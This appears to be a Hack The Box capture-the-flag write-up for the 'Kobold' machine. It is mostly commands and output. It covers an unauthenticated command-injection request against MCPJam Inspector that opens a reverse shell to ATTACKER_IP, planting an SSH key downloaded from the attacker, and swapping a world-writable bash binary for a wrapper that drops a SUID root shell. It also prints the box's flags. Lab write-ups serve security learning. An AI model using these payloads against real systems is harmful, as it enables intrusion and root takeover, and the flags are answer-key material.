# Kobold — Writeup
> Hack The Box | Medium | 2026-03-21

## Summary

Kobold is a Linux box running an MCP (Model Context Protocol) server testing tool alongside a Docker management platform. Initial access comes through an unauthenticated command injection in the MCPJam Inspector's stdio transport, which spawns arbitrary commands server-side. Privilege escalation exploits a world-writable `/usr/bin/bash` binary — replacing it with a thin wrapper that creates a SUID copy of bash the next time root invokes it.

## Reconnaissance

A full TCP scan reveals four services:

```
PORT     STATE SERVICE  VERSION
22/tcp   open  ssh      OpenSSH 9.6p1 Ubuntu
80/tcp   open  http     nginx 1.24.0 (redirects to HTTPS)
443/tcp  open  ssl/http nginx 1.24.0
3552/tcp open  http     Arcane Docker Management v1.13.0 (Go/SvelteKit)
```

The SSL certificate names `kobold.htb` with a wildcard SAN `*.kobold.htb`, suggesting virtual hosts. Adding `kobold.htb` to `/etc/hosts` and fuzzing the Host header discovers two additional vhosts:

| Hostname | Service |
|----------|---------|
| `kobold.htb` | Static landing page ("Kobold Operations Suite") |
| `mcp.kobold.htb` | MCPJam Inspector — an MCP server testing tool |
| `bin.kobold.htb` | PrivateBin instance (found later via nginx config) |

The MCPJam Inspector immediately stands out. It's an open-source tool for interacting with MCP servers, and it supports multiple transport types — including **stdio**, which spawns a local process.

## Foothold — MCPJam Inspector Stdio RCE

### The Vulnerability

MCPJam Inspector's `/api/mcp/connect` endpoint accepts a stdio transport configuration that specifies a `command` and `args` to spawn as a child process. The intent is to launch a local MCP server binary for testing. The problem: **there is no authentication, and there is no validation of the command being spawned.**

Any HTTP client can POST to this endpoint and execute arbitrary commands on the server as the user running the Inspector process (`ben`).

### The Primitive

This is straightforward command injection through a design flaw. The stdio transport type is meant to spawn trusted local processes, but exposing it over an unauthenticated HTTP API turns it into an RCE primitive. The connection always reports failure (the command isn't actually an MCP server), but the subprocess executes regardless.

### Exploitation

Start a listener:

```bash
nc -lvnp 9001
```

Fire the RCE:

```bash
curl -sk -X POST https://mcp.kobold.htb/api/mcp/connect \
  -H 'Content-Type: application/json' \
  -d '{
    "serverConfig": {
      "type": "stdio",
      "command": "bash",
      "args": ["-c", "bash -i >& /dev/tcp/ATTACKER_IP/9001 0>&1"],
      "env": {}
    },
    "serverId": "x"
  }'
```

The curl command returns an MCP connection error — ignore it. The reverse shell lands on the listener:

```
ben@kobold:/usr/local/lib/node_modules/@mcpjam/inspector$ id
uid=1001(ben) gid=1001(ben) groups=1001(ben),37(operator)
```

### SSH Persistence

The reverse shell is fragile. For a stable session, plant an SSH key:

```bash
# On attacker: generate key and serve it
ssh-keygen -t ed25519 -f ~/.ssh/kobold_ben -N ""
cd ~/.ssh && python3 -m http.server 8888
```

Via the MCPJam RCE (fire a second payload):

```bash
mkdir -p /home/ben/.ssh && \
curl -s http://ATTACKER_IP:8888/kobold_ben.pub \
  -o /home/ben/.ssh/authorized_keys && \
chmod 700 /home/ben/.ssh && \
chmod 600 /home/ben/.ssh/authorized_keys
```

Now SSH in:

```bash
ssh -i ~/.ssh/kobold_ben ben@10.129.7.164
```

User flag:

```bash
cat /home/ben/user.txt
# f1057924705f1ae16e6b57d59b439aeb
```

## Privilege Escalation — World-Writable Bash

### Discovery

Post-access enumeration reveals a critical misconfiguration:

```bash
ls -la /usr/bin/bash
# -rwxrwxrwx 1 root root 1446024 ... /usr/bin/bash
```

`/usr/bin/bash` is **mode 0777** — world-writable. Any user can replace the bash binary. Checking `/etc/passwd` confirms root's login shell is `/bin/bash`:

```
root:x:0:0:root:/root:/bin/bash
```

This means: replace bash with a wrapper, wait for root to invoke it (via cron, login, or any bash-calling process), and the wrapper runs as root.

### The Wrapper

Back up the real bash and deploy a wrapper:

```bash
# Backup real bash
cp /usr/bin/bash /tmp/bash_orig

# Write the wrapper
cat > /tmp/bash_wrapper << 'EOF'
#!/usr/bin/dash
if [ "$(id -u)" = "0" ]; then
  cp /tmp/bash_orig /tmp/rootbash 2>/dev/null
  chmod u+s /tmp/rootbash 2>/dev/null
fi
exec /tmp/bash_orig "$@"
EOF

chmod +x /tmp/bash_wrapper
```

The wrapper uses `/usr/bin/dash` as its interpreter (not bash — that would be recursive). When root executes it, it silently copies the real bash to `/tmp/rootbash` with the SUID bit set. Then it transparently calls the real bash so the caller never notices.

Deploying it requires that no running process has bash open (ETXTBSY). Use the MCPJam RCE with `dash` as the command to avoid the lock:

```bash
curl -sk -X POST https://mcp.kobold.htb/api/mcp/connect \
  -H 'Content-Type: application/json' \
  -d '{
    "serverConfig": {
      "type": "stdio",
      "command": "dash",
      "args": ["-c", "cat /tmp/bash_wrapper > /usr/bin/bash && chmod 755 /usr/bin/bash"],
      "env": {}
    },
    "serverId": "x"
  }'
```

### Trigger and Root

Once the wrapper is in place, root must execute `/usr/bin/bash` at least once. On this box, a root-level process periodically invokes bash (likely a hidden root crontab or Arcane lifecycle operation). After a short wait:

```bash
ls -la /tmp/rootbash
# -rwsr-xr-x 1 root root 1446024 ... /tmp/rootbash
```

The SUID bit is set. Get a root shell:

```bash
/tmp/rootbash -p
```

```
rootbash-5.2# id
uid=1001(ben) gid=1001(ben) euid=0(root) groups=1001(ben),37(operator)
rootbash-5.2# cat /root/root.txt
98c2e7694dba838e4d28cf913f178fd0
```

## Flags

| Flag | Value |
|------|-------|
| User | `f1057924705f1ae16e6b57d59b439aeb` |
| Root | `98c2e7694dba838e4d28cf913f178fd0` |

## Key Takeaways

1. **MCP Inspector stdio transport is an RCE primitive.** Any MCP testing tool that exposes stdio transport over HTTP without authentication allows arbitrary command execution. The "connection failed" response is a red herring — the process still spawns. If you see an MCP Inspector during recon, check for stdio support immediately.

2. **World-writable system binaries are instant privesc.** The check is trivial: `find / -perm -0002 -type f 2>/dev/null | grep -E '/(bin|sbin|usr)/'`. If a shell interpreter is writable, replace it with a SUID-dropping wrapper and wait for a privileged process to call it.

3. **Always verify file type and size, not just permissions.** A 158-byte `/usr/bin/bash` is obviously not a real bash binary. Running `file /usr/bin/bash` or checking the byte count would have revealed the wrapper immediately. Permissions tell you what you *can* do; file contents tell you what *has been done*.

4. **Persistence before enumeration.** The MCPJam reverse shell was unstable. Planting an SSH key before doing anything else ensured we never lost access during the operation. The curl-download method for key planting is more reliable than echo/base64 through nested JSON encoding.

5. **Check for prior exploitation artifacts.** On shared HTB instances, other players may have already deployed payloads. Files like `/tmp/rootbash`, `/tmp/bash_orig`, and wrapper scripts in `/tmp/` are signals that the attack has already been executed — check their state before re-doing the work.
